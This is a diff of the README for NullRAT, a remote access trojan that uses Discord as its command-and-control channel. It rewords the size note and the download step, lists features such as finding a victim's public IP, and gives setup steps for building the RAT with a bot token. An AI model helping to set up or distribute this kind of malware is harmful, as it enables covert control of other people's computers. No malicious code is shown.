@@ -1,9 +1,9 @@
 # NullRAT
 Remote Access Trojan that uses Discord as C&C
 
-One of the main things about this RAT is, it is under 8mb, so you can upload it without nitro
+It is under 8mb, so you can upload it without nitro
 
-That's also why it doesn't have too many features compared to other Discord RATs
+As such, only the useful RAT Features are present inside this program
 
 ## Features:
 - Find the public IP of the victim
@@ -26,7 +26,7 @@ That's also why it doesn't have too many features compared to other Discord RATs
 - Python 3.6+ should be installed on the PC and added to path (pip folder should be added too)
 - Don't compile normally using pyinstaller, use the compiler provided
 1) [Create a Discord bot and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
-2) Download this repository as zip [unstable] / Dowload the release [stable]
+2) Clone / Download this repository as zip [recommended] / Dowload the release
 3) Execute "Install Dependencies.bat"
 4) Fill up the empty variables & bot token in RAT.py
 5) Execute "RATCompiler.bat"
